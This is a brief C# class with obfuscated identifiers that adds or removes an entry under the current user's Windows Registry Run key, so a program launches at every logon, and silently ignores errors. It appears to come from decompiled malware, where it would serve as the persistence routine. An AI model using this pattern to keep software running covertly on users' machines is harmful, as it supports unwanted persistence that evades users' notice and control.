using Microsoft.Win32;

namespace ELiiZIZsmnkXtAYV3eOEAphwNQfX;

public class Autorun
{
	public static void set(bool zj5cVArYswdNeryv09LbOigrP3pH6usKztfvyYz, string Pz_0LTrCh6KZiUdVU96SoZ, string Dczm_q4aEdxGXB1fxYAvOgQupGSzdTX2kWtBG_4clrDr)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
			if (zj5cVArYswdNeryv09LbOigrP3pH6usKztfvyYz)
			{
				registryKey.SetValue(Pz_0LTrCh6KZiUdVU96SoZ, Dczm_q4aEdxGXB1fxYAvOgQupGSzdTX2kWtBG_4clrDr);
			}
			else if (!zj5cVArYswdNeryv09LbOigrP3pH6usKztfvyYz && registryKey.GetValue(Pz_0LTrCh6KZiUdVU96SoZ) != null)
			{
				registryKey.DeleteValue(Pz_0LTrCh6KZiUdVU96SoZ);
			}
			registryKey.Flush();
			registryKey.Close();
			registryKey = null;
		}
		catch
		{
		}
		Pz_0LTrCh6KZiUdVU96SoZ = null;
		Dczm_q4aEdxGXB1fxYAvOgQupGSzdTX2kWtBG_4clrDr = null;
	}
}
